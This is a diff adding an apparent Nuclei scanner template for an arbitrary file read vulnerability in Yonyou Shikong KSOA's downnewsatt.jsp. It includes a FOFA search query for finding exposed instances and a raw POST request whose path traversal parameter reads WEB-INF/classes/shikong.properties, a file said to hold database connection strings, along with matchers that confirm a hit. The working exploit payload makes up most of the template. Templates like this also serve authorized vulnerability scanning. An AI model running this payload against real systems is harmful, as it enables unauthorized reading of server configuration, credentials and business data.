@@ -1,0 +1,27 @@
+id: yonyou-ksoa-downnewsatt-file-read
+
+info:
+  name: "用友时空KSOA downnewsatt.jsp 任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="用友-时空KSOA"
+        用友时空KSOA系统中的downnewsatt.jsp组件存在文件读取漏洞，攻击者可通过构造特定路径参数读取服务器任意文件内容。该漏洞允许未经授权的访问者获取系统配置文件、数据库连接字符串及敏感业务数据，可能造成系统权限丧失或数据泄露风险
+  tags: 用友时空KSOA
+
+http:
+- raw:
+  - |
+    POST /newspublish/downnewsatt.jsp HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    exclusivenm=../../WEB-INF/classes/shikong.properties
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'debug'
